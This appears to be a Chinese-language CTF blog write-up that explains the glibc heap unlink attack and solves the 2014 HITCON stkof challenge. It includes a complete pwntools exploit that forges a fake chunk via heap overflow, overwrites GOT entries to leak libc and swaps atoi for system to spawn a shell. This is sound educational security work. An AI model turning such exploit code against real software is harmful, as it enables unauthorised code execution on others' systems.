---
title: Unlink
date: '2025-03-18 16:10:14'
updated: '2025-05-16 16:38:34'
---
参考 [CSDN](https://blog.csdn.net/qq_41202237/article/details/108481889)

## 理解
unlink 就是在释放相邻的 chunk 已经被 free 的 chunk 时，会在 bins 中把已经被 free 掉的 chunk 取出来合并，合并完再重新分类（进 unsortedbin）在 unlink 的途中会涉及到指针的修改，可以利用可控的 chunk 来实现对对应指针的修改

### 利用条件
有堆指针的存放地址



依次释放了first_chunk、second_chunk、third_chunk，也就是说首先释放的是first，然后释放的是second，最后释放的是third

在双链表中的结构如下：

![](/images/81c60685cead0bfc6c791f199e824f08.png)

在 `unlink()`执行时会检查：

![](/images/6bb088f21e46c4dc846772289e7d30d8.png)

**<font style="background-color:#FBDE28;">检查1</font>**：检查与被释放chunk相邻高地址的chunk的prev_size的值是否等于被释放chunk的size大小

可以看左图绿色框中的内容，上面绿色框中的内容是second_chunk的size大小，下面绿色框中的内容是hollk5的prev_size，这两个绿色框中的数值是需要相等的（忽略P标志位）。在wiki上我记得在基础部分有讲过，如果一个块属于空闲状态，那么相邻高地址块的prev_size为前一个块的大小

**<font style="background-color:#FBDE28;">检查2</font>**：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0

可以看左图蓝色框中的内容，这里是hollk5的size，hollk5的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态

**<font style="background-color:#FBDE28;">检查3</font>**：检查前后被释放chunk的fd和bk

可以看左图红色框中的内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址

## 2014 HITCON stkof
先是 checksec：

![](/images/1467e9a3d83ca1c24f633ec47868491d.png)

没有 PIE，还有 Partial RELRO

根据逆向分析，在脚本里面定义一些函数，这样就可以更直观地看出题目给到了什么，一共四个选项，有三个是有用的

```python
def add(size):
    link.sendline(b'1')
    link.sendline(str(size))

def edit(index,size,content):
    link.sendline(b'2')
    link.sendline(str(index))
    link.sendline(str(size))
    link.sendline(str(content))

def delete(index):
    link.sendline(b'3')
    link.sendline(str(index))
```

程序把堆指针数组存在了 bss 段，还有已经创建了的 chunk 的索引也是存在 bss 段

![](/images/f8d90db07cf0d45b390779ab43e7ce9d.png)

> 我把原来的变量`::s`改成了`chunkptrs`，
>
> 把方括号里面的索引改成了`index`，这样方便看
>

在程序编辑堆块的时候，编辑尺寸没有限制，有堆溢出

![](/images/e84c0747e694dacc3cc21afd7e01b8da.png)

动调申请了 3 个 chunk 看了看，申请的大小都是 0x90

![](/images/365eac4f6e7cb5996463eb7e10f0da75.png)

这里一共有 6 个 chunk（不包括 top chunk），多出来了 3 个 chunk：

最早申请的 0x290 大小的 chunk 是 tcache 的管理结构，（刚开始做题的时候没 patch，用的本地 2.35 版本的 libc...后面 patch 回 2.23 版本的了）

剩下有两个不是 0xa0 大小的 chunk 是初次使用fget()函数和printf()函数的时候申请的缓冲区：

> <font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">如果程序没有显式地调用 </font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">setbuf()</font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);"> 或 </font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">setvbuf()</font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);"> 来控制缓冲区的行为，那么标准的输入和输出流（如 </font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">stdin</font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);"> 和 </font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">stdout</font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">）会自动分配缓冲区。这个缓冲区的大小通常由实现决定，可能会因为第一次调用 </font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">fgets()</font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);"> 或 </font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">printf()</font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);"> 等函数时申请</font>
>

因为 printf 是在 malloc 语句后面，所以第一次调用 printf 申请的缓冲区 chunk 在第一次 malloc 申请的 chunk 后面，要利用堆溢出漏洞就没有办法从第一个申请 的 chunk 下手了...所以得多申请几个，反正题目没有限制



一共申请 3 个 chunk，第一个抛弃掉，利用第二个 chunk 在里面伪造一个freechunk 再堆溢出修改第三个 chunk 的 size 和 previous_inuse 位，从而在第三个 chunk 被释放时触发 unlink，来修改存在 bss 段 chunkptrs 堆指针数组的指针

用平板手写理了一下思绪，红色的部分是要重点控制的

![](/images/cf931e3fbcbb4b605b15cee1f9b245e9.jpeg)

> 这图改了好几遍，发现还是有地方理解错了，伪造的 fakechunk 必须在 chunk2 开头处伪造，不然的话存在 bss 段上面的 chunk 指针（指向用户数据）指向的就不是 fakechunk，所以上面图里面 fakechunk 前面不会有 "data"，里面的"data"倒无所谓，fakechunk 的 size 对就行了
>
> 还有 fake_next_previous 跟 fake_next_size 标反了，fake_next_previous 才是重点
>

unlink 部分脚本：

```python
payload=p64(0)+p64(0x20)
payload+=p64(fd)+p64(bk)
payload+=p64(next_prev)+b'a'*0x8
payload+=p64(prev_size)+p64(0x90)
link.recvuntil(b'OK\n')
edit(2,len(payload),payload)
delete(3)
```

bss 段的 chunkptrs 堆指针数组在 unlink 之前的样子：

![](/images/39008a21080f7bc09acde95947096981.png)

### 具体的 unlink 过程
![](/images/1d400de159faf2bcc7b169728d334124.jpeg)

关键点

1. fakechunk 得从 chunk2 的用户数据起始处开始伪造
2. fakechunk 的 size 是到 next_prev_size 的大小，next_prev_size=fakechunk 的 size
3. fakechunk 的 fd 和 bk 要从 bss 段指向 chunk2 用户数据的堆指针附近选址，从而错位构造出 bss_third_chunk 和 bss_first_chunk，绕过 unlink 的检查
4. 覆盖 chunk3 的 previous_size 和 size 时，previous_size 是 fakechunk 的 size（包括 next_size），size 的 prev_inuse 得是 0

在布置好 fakechunk 和 chunk3 的 size 之后，free 掉 chunk3 之后：

![](/images/82026cff1e6c4e9f861d373ec180059d.png)

> 原本的 chunk3 的指针位置被清零了，但是 chunk2 的指针被改成了 chunkptrs 数组前面的地址，所以可以通过 edit chunk2 来篡改这段内存，从而实现任意修改
>

### 恍然大悟
不过，我这里想到了一个点，明明 unlink 会检查的是下一个 chunk 的 prev_size，为什么 WP （CSDN 还有 CTFwiki 都是）没有直接用 chunk3 的 prev_size 呢？还要在 chunk2 上面弄个next_prev_size 来绕过...

我试着把 chunk3 的 prev_size 弄成 fakechunk 的 size ，然后再把那些 next_prev_size 什么的去掉之后也还是打通了，这下省事儿了

所以上面那个 chunk 的图可以再简洁一点：

![](/images/fea6c925dd0872ccd66403bbe4fe1f49.jpeg)



前面 checksec 可以知道程序的 GOT 表 Partial RELRO，可以利用这里修改一些函数的 got 表

把 bss 段上面的指针数组 [0]、[1]、[2] 修改成 free 的 got 表、puts 的 got 表和 atoi 的 got 表

修改 free 的 got 表为 puts 的 plt，再 free [1] 也就是`puts(puts.got)`把 puts 的真正地址泄露：

```python
payload=b'a'*0x8+p64(elf.got['free'])+p64(elf.got['puts'])+p64(elf.got['atoi']) #0 1 2
edit(2,len(payload),payload)
payload=p64(elf.plt['puts'])
edit(0,len(payload),payload)
delete(1)

puts_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))
libc_base=puts_addr-0x06f5d0
print(hex(libc_base))
system_addr=libc_base+0x045380
```

接下来就是把 atoi 函数（菜单负责把输入转换为整数的函数）改成 system 函数，然后直接输入`/bin/sh`就成功 getshell 啦！

```python
payload=p64(system_addr)
edit(2,len(payload),payload)
link.sendline(b'/bin/sh')
link.interactive()
```

完整 exp：

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# link=remote("node5.buuoj.cn",28828)
link=process("./stkof")
elf=ELF('./stkof')

def add(size):
    link.sendline(b'1')
    link.sendline(str(size))

def edit(index,size,content):
    link.sendline(b'2')
    link.sendline(str(index))
    link.sendline(str(size))
    link.sendline(content)

def delete(index):
    link.sendline(b'3')
    link.sendline(str(index))

add(0x98)
link.recvuntil(b'OK\n')
add(0x30)
link.recvuntil(b'OK\n')
add(0x80)

# gdb.attach(link,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu3_amd64/')
# pause()

chunkptrs=0x602140
fd=0x602138
bk=0x602140
next_prev=0x20
prev_size=0x30
# payload=p64(0)+p64(0x20)+p64(fd)+p64(bk)+p64(next_prev)+b'a'*0x8+p64(prev_size)+p64(0x90) #在chunk2当中伪造fakechunk还有next_previous
payload=p64(0)+p64(0x30)+p64(fd)+p64(bk)+b'a'*0x10+p64(prev_size)+p64(0x90)

link.recvuntil(b'OK\n')
edit(2,len(payload),payload) #通过chunk2控制chunk3的size

delete(3)
payload=b'a'*0x8+p64(elf.got['free'])+p64(elf.got['puts'])+p64(elf.got['atoi']) #0 1 2
edit(2,len(payload),payload)
payload=p64(elf.plt['puts'])
edit(0,len(payload),payload)
delete(1)
puts_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base=puts_addr-0x06f5d0
print(hex(libc_base))
system_addr=libc_base+0x045380
payload=p64(system_addr)
edit(2,len(payload),payload)
link.sendline(b'/bin/sh')

link.interactive()
```

